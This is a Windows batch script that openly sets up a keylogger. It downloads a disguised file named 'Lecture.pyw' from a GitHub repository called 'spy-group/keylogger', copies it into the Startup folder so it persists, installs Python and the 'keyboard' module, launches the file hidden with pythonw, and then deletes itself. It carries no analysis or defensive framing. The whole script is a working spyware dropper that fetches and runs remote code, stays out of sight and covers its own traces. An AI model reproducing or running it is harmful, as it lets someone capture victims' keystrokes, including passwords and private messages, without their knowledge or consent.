@echo off
echo Setting up Keylogger...

REM Step 1: Download Lecture.pyw from GitHub
echo Downloading Lecture.pyw from GitHub...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/spy-group/keylogger/raw/main/Lecture.pyw' -OutFile '%USERPROFILE%\Downloads\Lecture.pyw'"

REM Step 2: Move Lecture.pyw to Startup folder
echo Moving Lecture.pyw to Startup folder...
move "%USERPROFILE%\Downloads\Lecture.pyw" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

REM Step 3: Open Microsoft Store for Python 3.12 installation
echo Opening Microsoft Store for Python 3.12 installation...
start ms-windows-store://pdp/?productid=9NCVDN91XZQP

REM Wait for Microsoft Store to open
timeout /t 10 >nul

REM Step 4: Wait for Python to be installed
echo Waiting for Python 3.12 to be installed...
:check_python
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed yet. Waiting...
    timeout /t 10 >nul
    goto check_python
)

REM Step 5: Install the 'keyboard' module
echo Installing 'keyboard' module...
pip install keyboard

REM Step 6: Run Lecture.pyw in hidden mode using pythonw.exe
echo Running Lecture.pyw in hidden mode...
start /b pythonw "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw"

REM Step 7: Delete the BAT file after execution
echo Deleting BAT file...
del "%~f0"

REM Step 8: Close CMD window automatically
exit
